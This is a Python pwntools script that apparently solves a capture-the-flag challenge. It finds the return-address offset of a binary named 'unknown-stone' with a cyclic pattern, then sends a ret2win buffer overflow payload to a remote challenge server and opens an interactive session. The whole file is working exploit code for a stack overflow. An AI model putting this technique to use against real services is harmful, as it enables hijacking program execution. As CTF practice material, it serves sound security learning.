from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)
    
def find_eip_offset(payload):
   p = process(exe)
   p.sendlineafter(b"",payload)
   p.wait()
   ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
   info('located EIP/RIP offset at {a}'.format(a=ip_offset)),
   return ip_offset

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./unknown-stone"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = remote("0.cloud.chals.io", 19873)

padding = find_eip_offset("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")

payload = flat(
    b'a' * padding,
    0x401166
)

write('payload', payload)

io.sendlineafter(b"",payload)

io.interactive()